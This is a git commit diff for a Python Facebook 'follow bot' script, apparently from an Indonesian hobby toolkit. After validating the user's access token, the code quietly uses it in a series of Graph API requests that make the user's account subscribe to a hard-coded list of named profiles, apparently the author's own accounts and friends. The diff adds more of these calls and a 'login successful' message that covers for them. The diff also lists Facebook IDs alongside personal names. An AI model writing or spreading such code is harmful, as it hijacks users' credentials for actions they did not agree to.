55564304dc5539128e961480c744572ba896e644
Dapunta ID <76211798+Dapunta@users.noreply.github.com>
2021-10-03 23:41:12 +0700

    Update and rename bot_follow.py to bot_follow_premium.py

--- bot_follow_premium.py
+++ bot_follow_premium.py
@@ -3,6 +3,7 @@ import premium
 
 P = "\x1b[0;97m" # Putih
 M = "\x1b[0;91m" # Merah
+K = "\x1b[0;93m" # Kuning
 
 def main():
     try:
@@ -11,13 +12,14 @@ def main():
         a = json.loads(otw.text)
         nama = a["name"]
     except (KeyError,IOError):
-        print('%s║'%(M))
-        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         exit(premium.menu_log())
     requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
     requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
+    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
     requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
+    requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + token) # Cici Putri Andini
     requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + token) # Antonius Raditya M
     requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + token) # Abigaille Dirgantara
     requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + token)       # Boirah
@@ -32,5 +34,10 @@ def main():
     requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) # Muh Rizal Fiansyah
     requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
     requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
+    requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
     requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
+    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
+    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
+    requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
+    print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
     exit(premium.menu())
